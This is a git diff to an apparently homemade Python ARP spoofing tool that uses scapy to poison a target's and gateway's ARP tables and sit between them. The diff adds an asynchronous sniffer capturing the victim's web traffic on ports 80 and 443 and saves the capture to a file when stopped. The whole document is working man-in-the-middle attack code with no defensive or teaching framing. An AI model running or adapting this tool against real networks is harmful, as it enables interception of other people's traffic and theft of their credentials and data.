@@ -1,11 +1,8 @@
 import scapy.all as scapy
 from cSubprocess import *
 from networking import *
+from exporting import *;
 import time 
-
-def sniff_packets():
-    packets = scapy.sniff(filter='tcp', count=10)
-    print(packets.show)
 
 class ArpSpoofer:
     default_gateway_ip = None
@@ -50,8 +47,14 @@ class ArpSpoofer:
     # Method to spoof ARP tables for target and gateway devices
     def spoof(self, gateway_ip, target_ip):
         try:
+            # Begin Capture
+
             # target_filter = "host " + target_ip + " and tcp"
-            # capture = scapy.sniff(iface="eth0", filter=target_filter)
+            # capture_device = scapy.AsyncSniffer(iface="eth0", filter=target_filter)
+            target_filter = "tcp port 80 or tcp port 443"
+            capture_device = scapy.AsyncSniffer(iface="eth0", filter=target_filter)
+            capture_device.start()
+
             while True:
                 target_mac = get_mac_address(target_ip)
                 gateway_mac = get_mac_address(gateway_ip)
@@ -75,5 +78,7 @@ class ArpSpoofer:
 
                 time.sleep(2) # Resend packets every 2 seconds (changing might affect spoofing effectiveness)
         except KeyboardInterrupt:
-            scapy.wrpcap("packet_log.pcap", capture) # Log capture to a file
+            capture = capture_device.stop()
+            writeCapture(capture)
+
             self.cleanup(gateway_ip, target_ip) # Restore ARP tables and remove the MITM position
